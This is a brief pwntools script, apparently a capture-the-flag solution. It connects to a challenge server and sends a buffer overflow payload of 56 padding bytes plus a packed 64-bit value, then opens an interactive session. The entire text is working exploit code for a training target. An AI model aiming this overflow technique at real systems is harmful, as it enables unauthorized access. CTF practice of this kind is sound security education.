from pwn import *

r = remote("challs.ctf.cafe", 7777)
# r = process("./chall")
# input()
r.sendline(b"a"*56 + p64(0xc0febabe))

r.interactive()
